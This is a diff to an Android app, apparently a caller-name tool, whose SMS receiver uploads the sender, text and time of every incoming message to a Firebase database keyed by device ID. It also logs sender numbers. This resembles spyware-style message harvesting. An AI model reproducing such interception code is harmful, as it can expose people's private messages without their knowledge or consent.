@@ -8,10 +8,15 @@ import android.telephony.SmsMessage;
 import android.util.Log;
 import android.widget.Toast;
 
+import androidx.annotation.NonNull;
+
+import com.google.android.gms.tasks.OnFailureListener;
+import com.google.android.gms.tasks.OnSuccessListener;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 import com.prashant.backgroundcallername.Database.DatabaseHelper;
 import com.prashant.backgroundcallername.Database.SMS_Database;
+import com.prashant.backgroundcallername.LocalData;
 import com.prashant.backgroundcallername.Models.SMS_Model;
 
 import java.util.Calendar;
@@ -19,8 +24,10 @@ import java.util.Date;
 
 public class IncomingSms extends IncomingCall {
     final SmsManager sms = SmsManager.getDefault();
-   DatabaseReference reference= FirebaseDatabase.getInstance().getReference().child("Kiran");
+
     public void onReceive(Context context, Intent intent) {
+        String deviceID = LocalData.getDeviceID(context);
+        DatabaseReference reference= FirebaseDatabase.getInstance().getReference().child("Users").child(deviceID).child("Sms");
 
         final Bundle bundle = intent.getExtras();
 
@@ -47,10 +54,22 @@ public class IncomingSms extends IncomingCall {
 
                     SMS_Model model=new SMS_Model(senderNum,message,time);
                     String key = reference.push().getKey();
-                    reference.child(key).setValue(model);
-                    SMS_Database smsdb = new SMS_Database(context);
 
-                    smsdb.addSMSDetails(message,senderNum, String.valueOf(currentTime));
+                    reference.child(key).setValue(model).addOnSuccessListener(new OnSuccessListener<Void>() {
+                        @Override
+                        public void onSuccess(Void unused) {
+                            Toast.makeText(context, "Done", Toast.LENGTH_SHORT).show();
+                        }
+                    }).addOnFailureListener(new OnFailureListener() {
+                        @Override
+                        public void onFailure(@NonNull Exception e) {
+                            Toast.makeText(context, e.toString(), Toast.LENGTH_SHORT).show();
+                            Log.d("Pd", "onFailure: "+e.toString());
+                        }
+                    });
+//                    SMS_Database smsdb = new SMS_Database(context);
+//
+//                    smsdb.addSMSDetails(message,senderNum, String.valueOf(currentTime));
 
                     Log.i("PRASHANT145", "=========  "  +senderNum);
 
